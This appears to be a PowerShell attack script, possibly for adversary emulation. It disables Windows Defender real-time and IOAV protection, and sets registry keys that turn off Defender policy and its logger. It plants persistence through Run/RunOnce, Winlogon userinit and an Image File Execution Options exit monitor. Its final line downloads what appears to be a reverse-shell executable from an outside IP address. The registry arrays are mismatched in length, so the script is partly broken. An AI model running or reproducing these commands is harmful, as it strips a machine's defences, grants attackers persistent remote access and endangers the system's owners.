# This script doesn't hijack a DLL but checks for unexpected DLL loads.
Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operational | Where-Object { $_.Id -eq 7 }

# This script retrieves WMI event subscriptions.
Get-WmiObject -Namespace root\Subscription -Class __EventFilter

Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
Set-MpPreference -DisableIOAVProtection $true



# Define the registry details as multiline arrays
$registryPaths = @(
    #Run and Run Once
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServices",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices",
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce",
    #Winlogon
    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
    #Windows Defender
    "HKLM:\System\CurrentControlSet\Services\SecurityHealthService",
    "HKLM:\Software\Policies\Microsoft\Windows Defender",
    "HKLM:\Software\Policies\Microsoft\Windows Defender",
    "HKLM:\Software\Policies\Microsoft\Windows Defender",
    #Defender Logger
    "HKLM:\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger",
    #Run after kill notepad.exe
    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe"
)

$registryNames = @(
    #Run and RunOnce
    "UrsusAmericanus",
    "UrsusAmericanus",
    "UrsusAmericanus",
    "UrsusAmericanus",
    "UrsusAmericanus",
    "UrsusAmericanus",
    "UrsusAmericanus",
    "UrsusAmericanus",
    #Winlogon
    "userinit",
    #Windows Defender
    "Start",
    "delete",
    "DisableAntiSpyware",
    "DisableAntiVirus",
    #Defender Logger
    "Start",
    #Run after kill notepad.exe
    "GlobalFlag",
    "ReportingMode",
    "MonitorProcess"
)

$registryDataList = @(
    #Run and RunOnce
    "C:\temp\Polar_Bear.ps1",
    "C:\temp\Polar_Bear.ps1",
    "C:\temp\Polar_Bear.ps1",
    "C:\temp\Polar_Bear.ps1",
    "C:\temp\Polar_Bear.ps1",
    "C:\temp\Polar_Bear.ps1",
    "C:\temp\Polar_Bear.ps1",
    "C:\temp\Polar_Bear.ps1",
    #Winlogon
    "C:\windows\system32\userinit.exe,C:\temp\Polar_Bear.ps1",
    #Windows Defender
    "4",
    "delete",
    "1",
    "1",
    #Defender Logger
    "0",
    #Run after kill notepad.exe
    "512",
    "1",
    "C:\temp\UrsusArctos.exe"
)

$registryActions = @(
    #Run and RunOnce
    "add",
    "add",
    "add",
    "add",
    "add",
    "add",
    "add",
    "add",
    #Winlogon
    "add",
    #Windows Defender
    "add",
    "delete",
    "add",
    "add",
    #Defender Logger
    "add",
    #Run after kill notepad.exe
    "add",
    "add",
    "add"
)


for ($i = 0; $i -lt $registryPaths.Length; $i++) {
    $registryPath = $registryPaths[$i]
    $registryName = $registryNames[$i]
    $registryData = $registryDataList[$i]
    $registryAction = $registryActions[$i]

    if ($registryAction -eq "add") {
        # Attempt to add the registry using PowerShell's Set-ItemProperty
        if (-not (Test-Path $registryPath)){
                New-Item -Path $registryPath -Force
                Write-Output "Registry key $registryPath created!"
        }
        try {
            Set-ItemProperty -Path $registryPath -Name $registryName -Value $registryData
            Write-Output "Registry addition for $registryPath was successful!"
        } catch {
            Write-Output "Registry addition for $registryPath failed."
        }
    } elseif ($registryAction -eq "delete") {
        # Attempt to delete the registry using PowerShell's Remove-ItemProperty
        try {
            Remove-Item -Path $registryPath -Name $registryName
            Write-Output "Registry deletion for $registryPath was successful!"
        } catch {
            Write-Output "Registry deletion for $registryPath failed."
        }
    }
}




iwr 'http://175.45.176.100/rev_tcp.exe' -o 'C:/temp/UrsusArctos.exe'